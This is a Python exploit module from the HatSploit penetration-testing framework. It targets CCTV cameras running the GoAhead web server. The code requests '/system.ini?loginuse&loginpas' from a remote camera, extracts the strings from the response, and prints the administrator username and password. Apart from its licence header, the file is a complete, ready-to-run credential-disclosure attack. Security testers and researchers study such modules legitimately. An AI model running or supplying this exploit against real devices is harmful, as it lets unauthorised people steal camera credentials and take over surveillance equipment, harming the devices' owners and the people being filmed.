#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.http.http import http
from utils.string.string import string

class HatSploitModule(HatSploitModule):
    http = http()
    string = string()

    details = {
        'Name': "CCTV GoAhead Camera Password Disclosure",
        'Module': "exploit/multi/cctv_goahead_camera/password_disclosure",
        'Authors': [
            'enty8080'
        ],
        'Description': "CCTV GoAhead Camera password disclosure exploit.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "multi",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 81,
            'Type': "port",
            'Required': True
        },
        'USERNAME': {
            'Description': "Default username.",
            'Value': "admin",
            'Type': None,
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port, username):
        target_url = self.http.craft_url(remote_host, remote_port)

        if not self.http.check_url_access(target_url):
            self.badges.output_error("Exploit failed!")
            return

        self.badges.output_process("Generating payload...")
        payload = '/system.ini?loginuse&loginpas'

        self.badges.output_process("Sending payload...")
        response = self.http.http_request("GET", target_url, payload)

        if response.status_code != 200:
            self.badges.output_error("Failed to send payload!")
            self.badges.output_error("Exploit failed!")
            return

        gathered_data = response.text
        strings = self.string.extract_strings(gathered_data)

        if username in strings:
            username_index = strings.index(username)
            password_index = username_index + 1

            self.badges.output_information("Username: " + strings[username_index])
            self.badges.output_information("Password: " + strings[password_index])
        else:
            self.badges.output_warning("Target vulnerable, but default username in not " + username + "!")

    def run(self):
        remote_host, remote_port, username = self.parser.parse_options(self.options)

        target = self.http.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")

        self.exploit(remote_host, remote_port, username)
